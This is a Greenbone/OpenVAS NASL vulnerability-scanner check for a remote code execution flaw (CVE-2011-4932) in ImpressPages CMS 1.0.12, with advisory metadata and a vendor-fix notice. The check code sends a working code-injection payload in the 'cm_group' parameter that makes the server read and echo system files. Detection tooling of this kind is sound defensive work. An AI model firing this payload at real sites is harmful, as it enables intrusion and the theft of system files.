if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103378" );
	script_cve_id( "CVE-2011-4932" );
	script_bugtraq_id( 49798 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "ImpressPages CMS 'actions.php' Remote Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49798" );
	script_xref( name: "URL", value: "http://www.impresspages.org/" );
	script_xref( name: "URL", value: "http://www.impresspages.org/news/impresspages-1-0-13-security-release/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/521118" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-01-06 10:27:46 +0100 (Fri, 06 Jan 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
information." );
	script_tag( name: "summary", value: "ImpressPages CMS is prone to a remote-code execution vulnerability." );
	script_tag( name: "impact", value: "Exploiting this issue will allow attackers to execute arbitrary code
within the context of the affected application." );
	script_tag( name: "affected", value: "ImpressPages CMS 1.0.12 is vulnerable, other versions may also
be affected." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/impress", "/impresspages", "/imprescms", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/";
	buf = http_get_cache( item: url, port: port );
	if(IsMatchRegexp( buf, "Powered by.*ImpressPages" )){
		for file in keys( files ) {
			url = dir + "/?cm_group=text_photos\\\\title\\\\Module();echo%20file_get_contents(%27/" + files[file] + "%27);echo&cm_name=vt-test";
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

